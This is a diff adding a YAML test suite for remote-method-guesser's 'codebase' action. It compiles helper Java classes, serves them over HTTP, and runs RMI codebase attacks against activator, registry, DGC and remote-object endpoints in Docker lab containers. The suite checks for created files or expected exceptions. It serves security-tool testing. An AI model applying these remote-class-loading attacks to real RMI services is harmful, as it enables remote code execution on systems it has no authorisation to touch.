@@ -1,0 +1,178 @@
+global:
+
+  title: Codebase Tests
+  description: "Performs tests on remote-methods-guessers 'codebase' action."
+
+
+plugins:
+  os_command:
+    cmd:
+      - javac
+      - -source
+      - 1.8
+      - -target
+      - 1.8
+      - '../utils/${codebase-class}1.java'
+      - '../utils/${codebase-class}2.java'
+      - '../utils/${codebase-class}3.java'
+      - '../utils/${codebase-class}4.java'
+
+  http_listener:
+    port: 8000
+    dir: ../utils
+
+
+definitions:
+
+  - title: Activator Codebase Call
+    description: >
+      'Performs a codebase attack on the activator endpoint.'
+      'The expected result is a file being created within the docker'
+      'volume.'
+
+    command: '${BASE-CMD-9}'
+    arguments:
+      - codebase
+      - '${codebase-class}1'
+      - 'http://${DOCKER-rmg-jdk9-GATEWAY}:8000/'
+      - --signature
+      - act
+    validators:
+      error: False
+      regex: 'Codebase attack.+successful'
+      file_exists:
+        clean_up: True
+        files:
+          - '${volume}/${codebase-class}1.txt'
+
+
+  - title: Registry Codebase Call
+    description: >
+      'Performs a codebase attack on the registry endpoint.'
+      'The expected result is a file being created within the docker'
+      'volume.'
+
+    command: '${BASE-CMD-9}'
+    arguments:
+      - codebase
+      - '${codebase-class}2'
+      - 'http://${DOCKER-rmg-jdk9-GATEWAY}:8000/'
+      - --signature
+      - reg
+    validators:
+      error: False
+      regex: 'Codebase attack.+worked'
+      file_exists:
+        clean_up: True
+        files:
+          - '${volume}/${codebase-class}2.txt'
+
+
+  - title: DGC Codebase Call
+    description: >
+      'Performs a codebase attack on the DGC endpoint.'
+      'The expected result is an AccessControlException'
+
+    command: '${BASE-CMD-9}'
+    arguments:
+      - codebase
+      - '${codebase-class}'
+      - 'http://${DOCKER-rmg-jdk9-GATEWAY}:8000/'
+      - --signature
+      - dgc
+    validators:
+      error: False
+      contains:
+        values:
+          - 'AccessControlException'
+          - 'SecurityManager'
+
+
+  - title: Method Codebase Call
+    description: >
+      'Performs a codebase attack on the plain-server remote object.'
+      'The expected result is a file being created within the docker'
+      'volume.'
+
+    command: '${BASE-CMD-SSL-9}'
+    arguments:
+      - codebase
+      - '${codebase-class}3'
+      - 'http://${DOCKER-rmg-jdk9-GATEWAY}:8000/'
+      - --signature
+      - 'String system(String dummy, String[] dummy2)'
+      - --bound-name
+      - plain-server
+    validators:
+      error: False
+      contains:
+        values:
+          - 'load dummy class'
+          - 'attack probably worked'
+      file_exists:
+        clean_up: True
+        files:
+          - '${volume}/${codebase-class}3.txt'
+
+
+  - title: Method Codebase Call (Legacy)
+    description: >
+      'Performs a codebase attack on the legacy-service remote object.'
+      'The expected result is a file being created within the docker'
+      'volume.'
+
+    command: '${BASE-CMD-9}'
+    arguments:
+      - codebase
+      - '${codebase-class}4'
+      - 'http://${DOCKER-rmg-jdk9-GATEWAY}:8000/'
+      - --signature
+      - 'String login(java.util.HashMap dummy1)'
+      - --bound-name
+      - legacy-service
+    validators:
+      error: False
+      contains:
+        values:
+          - 'load dummy class'
+          - 'attack probably worked'
+      file_exists:
+        clean_up: True
+        files:
+          - '${volume}/${codebase-class}4.txt'
+
+
+  - title: Missing Signature
+    description: >
+      'Performs a codebase attack with missing --signature option and checks'
+      'the corresponding error message.'
+
+    command: '${BASE-CMD-9}'
+    arguments:
+      - codebase
+      - '${codebase-class}4'
+      - 'http://${DOCKER-rmg-jdk9-GATEWAY}:8000/'
+    validators:
+      error: True
+      contains:
+        values:
+          - '--signature option is required'
+
+
+  - title: No Class Load
+    description: >
+      'Performs a codebase attack with a wrong specified listener port.'
+
+    command: '${BASE-CMD-9}'
+    arguments:
+      - codebase
+      - 'Test'
+      - 'http://127.0.0.1:8002/'
+      - --signature
+      - act
+    validators:
+      error: False
+      contains:
+        values:
+          - 'Caught ClassNotFoundException'
+          - 'not be loaded'
